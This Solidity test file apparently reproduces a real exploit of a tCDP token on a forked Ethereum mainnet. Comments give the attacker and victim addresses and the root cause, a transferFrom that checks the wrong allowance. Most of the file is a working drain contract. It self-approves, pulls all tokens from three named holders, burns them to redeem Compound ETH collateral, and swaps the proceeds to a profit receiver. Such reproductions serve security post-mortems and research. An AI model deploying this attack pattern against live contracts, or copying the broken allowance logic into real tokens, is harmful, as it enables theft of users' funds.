// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2.02 ETH
// Attacker : 0xd49Cb0924F871bCFd78EA4187d9E6Bd943f85D98
// Attack Contract : 0xC3D478F039125c536bC3c3eFBaEac7c1a15BcB1B
// Vulnerable Contract : 0xdA4c9Ee8373fd1095379a3Dd457A0c78968AaF03
// Attack Tx : https://etherscan.io/tx/0x9879031462b16dbf063377c4a8e5b043662576a9a3fb282c5a656953ad00684e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xdA4c9Ee8373fd1095379a3Dd457A0c78968AaF03#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/932
//
// Attack summary: The attacker self-approved tCDP, used a broken transferFrom allowance check to pull
// all outstanding tCDP from three unrelated holders, then burned the stolen tCDP to redeem Compound ETH
// collateral.
// Root cause: transferFrom subtracts from _allowed[msg.sender][to] after transferring from the supplied
// from address, instead of checking _allowed[from][msg.sender].

address constant ATTACKER = 0xd49cB0924F871BcFD78eA4187D9e6bd943F85D98;
address constant ROOT_ATTACK_CONTRACT = 0xc3D478F039125c536BC3c3efbAEAc7C1A15bcb1b;
address constant TCDP_TOKEN = 0xda4C9Ee8373Fd1095379a3Dd457A0c78968aAF03;
address constant HOLDER_ONE = 0x5380E20f0bEc4DCf8090Fb2dA0FdC4FE7a6bc023;
address constant HOLDER_TWO = 0x1D075f1F543bB09Df4530F44ed21CA50303A65B2;
address constant HOLDER_THREE = 0x27f735fEdC57fc1682104d40455d14FB93B21B0c;
address constant DAI_TOKEN = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

interface ITCDP {
    function approve(
        address spender,
        uint256 value
    ) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function balanceOf(
        address owner
    ) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function burn(
        uint256 amount
    ) external;
    function isCompound() external view returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 22_364_243);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(TCDP_TOKEN, "tCDP");
        vm.label(HOLDER_ONE, "tCDP Holder One");
        vm.label(HOLDER_TWO, "tCDP Holder Two");
        vm.label(HOLDER_THREE, "tCDP Holder Three");
        vm.label(DAI_TOKEN, "DAI");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
    }

    function testExploit() public balanceLog {
        ITCDP tcdp = ITCDP(TCDP_TOKEN);

        assertTrue(tcdp.isCompound());
        assertEq(tcdp.totalSupply(), 2_112_941_787_257_735_085);
        assertEq(tcdp.balanceOf(HOLDER_ONE), 2_101_941_787_257_735_085);
        assertEq(tcdp.balanceOf(HOLDER_TWO), 10_000_000_000_000_000);
        assertEq(tcdp.balanceOf(HOLDER_THREE), 1_000_000_000_000_000);

        vm.deal(address(this), 0.1 ether);
        TCDPDrainAttack attack = new TCDPDrainAttack{value: 0.1 ether}(payable(address(this)));
        attack.run();

        assertEq(tcdp.balanceOf(HOLDER_ONE), 0);
        assertEq(tcdp.balanceOf(HOLDER_TWO), 0);
        assertEq(tcdp.balanceOf(HOLDER_THREE), 0);
        assertGt(address(this).balance, 2.0 ether);
    }
}

contract TCDPDrainAttack {
    address payable private immutable profitReceiver;

    receive() external payable {}

    constructor(
        address payable _profitReceiver
    ) payable {
        profitReceiver = _profitReceiver;
    }

    function run() external {
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_TOKEN;
        buyPath[1] = DAI_TOKEN;

        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
        .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, buyPath, address(this), block.timestamp
        );

        IERC20(DAI_TOKEN).approve(TCDP_TOKEN, type(uint256).max);
        ITCDP(TCDP_TOKEN).approve(address(this), type(uint256).max);

        _stealHolderBalance(HOLDER_ONE);
        _stealHolderBalance(HOLDER_TWO);
        _stealHolderBalance(HOLDER_THREE);

        uint256 stolenTcdp = ITCDP(TCDP_TOKEN).balanceOf(address(this));
        ITCDP(TCDP_TOKEN).burn(stolenTcdp);

        uint256 daiRemainder = IERC20(DAI_TOKEN).balanceOf(address(this));
        IERC20(DAI_TOKEN).approve(UNISWAP_V2_ROUTER, daiRemainder);

        address[] memory sellPath = new address[](2);
        sellPath[0] = DAI_TOKEN;
        sellPath[1] = WETH_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                daiRemainder, 0, sellPath, profitReceiver, block.timestamp
            );

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function _stealHolderBalance(
        address holder
    ) private {
        uint256 holderBalance = ITCDP(TCDP_TOKEN).balanceOf(holder);
        ITCDP(TCDP_TOKEN).transferFrom(holder, address(this), holderBalance);
    }
}
